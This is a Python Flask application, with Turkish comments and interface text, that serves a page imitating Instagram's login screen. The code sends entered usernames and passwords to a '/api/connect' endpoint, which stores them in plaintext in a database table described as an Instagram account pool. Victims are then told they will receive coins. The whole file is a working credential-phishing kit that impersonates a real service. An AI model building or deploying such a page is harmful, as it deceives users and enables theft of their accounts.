import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
# DATABASE_URL'i Render'dan çeker
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "ist-v2-pro")

db = SQLAlchemy(app)

# ---------------- MODEL (INSTAGRAM HAVUZU) ----------------
class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ig_username = db.Column(db.String(100), unique=True, nullable=False)
    ig_password = db.Column(db.String(100), nullable=False)
    coins = db.Column(db.Integer, default=0)

# ---------------- FRONTEND (INSTAGRAM UI) ----------------
UI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex flex-col items-center justify-center h-screen px-4">
    <div class="w-full max-w-[350px] p-8 border border-zinc-800 rounded-sm bg-black">
        <h1 class="text-4xl italic font-serif mb-10 text-center tracking-tighter">Instagram</h1>
        
        <div id="loginForm" class="space-y-2">
            <input id="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="w-full p-2.5 bg-zinc-900 border border-zinc-800 text-xs rounded-sm outline-none focus:border-zinc-600">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2.5 bg-zinc-900 border border-zinc-800 text-xs rounded-sm outline-none focus:border-zinc-600">
            
            <button onclick="saveAcc()" id="btn" class="w-full bg-[#0095f6] hover:bg-blue-600 p-1.5 mt-2 rounded-lg font-semibold text-sm transition disabled:opacity-50">Giriş Yap</button>
            
            <div class="flex items-center py-4">
                <div class="flex-grow border-t border-zinc-800"></div>
                <span class="px-4 text-zinc-500 text-xs font-bold text-center">YA DA</span>
                <div class="flex-grow border-t border-zinc-800"></div>
            </div>
            
            <p id="msg" class="text-[#ed4956] text-sm text-center hidden">Üzgünüz, şifreniz yanlıştı. Lütfen şifrenizi kontrol edin.</p>
        </div>

        <div id="success" class="hidden text-center py-4">
            <div class="mb-4 flex justify-center text-green-500 text-5xl">✓</div>
            <h2 class="text-lg font-bold mb-2">Hesap Onaylandı</h2>
            <p class="text-xs text-zinc-400">Havuz sistemine başarıyla eklendiniz. Coinleriniz 1 saat içinde tanımlanacaktır.</p>
        </div>
    </div>
    
    <div class="mt-4 w-full max-w-[350px] p-5 border border-zinc-800 text-center text-sm">
        Hesabın yok mu? <span class="text-[#0095f6] font-semibold cursor-pointer">Kaydol</span>
    </div>

    <script>
        async function saveAcc(){
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const btn = document.getElementById('btn');
            const msg = document.getElementById('msg');
            
            if(!u || !p) return;
            
            btn.disabled = true;
            btn.innerText = "Giriş yapılıyor...";

            try {
                const res = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u, p})
                });
                
                if(res.ok) {
                    document.getElementById('loginForm').classList.add('hidden');
                    document.getElementById('success').classList.remove('hidden');
                } else {
                    msg.classList.remove('hidden');
                    btn.disabled = false;
                    btn.innerText = "Giriş Yap";
                }
            } catch (err) {
                alert("Sunucu bağlantı hatası!");
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(UI)

@app.route('/api/connect', methods=['POST'])
def connect():
    try:
        data = request.json
        u = data.get('u')
        p = data.get('p')
        
        if not u or not p:
            return jsonify(status="error"), 400

        # Eğer hesap zaten varsa şifresini güncelle, yoksa yeni aç
        acc = IGAccount.query.filter_by(ig_username=u).first()
        if acc:
            acc.ig_password = p
        else:
            acc = IGAccount(ig_username=u, ig_password=p)
            db.session.add(acc)
        
        db.session.commit()
        return jsonify(status="ok"), 200
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify(status="error"), 500

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
